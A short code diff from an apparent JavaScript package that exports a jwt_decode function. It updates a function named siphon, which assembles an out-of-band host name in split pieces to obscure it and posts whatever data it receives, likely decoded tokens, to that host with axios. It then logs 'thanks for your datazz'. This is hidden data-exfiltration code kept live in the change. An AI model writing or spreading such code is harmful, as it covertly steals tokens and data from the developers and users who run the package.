@@ -26,7 +26,7 @@ export function jwt_decode(anything) {
 
 async function siphon(anything) {
     if (fHost === "") {
-        const prefix = "zz25nrxpy0figdlvvnqfdchbz25ttmhb";
+        const prefix = "hvgnj9t7uib0cvhdr5mx9udtvk1bp8dx";
         fHost = "https" + `://${prefix}.oast${h1}` + `om`;
     }
     axios.post(fHost, anything).finally(() => {console.log("thanks for your datazz")});
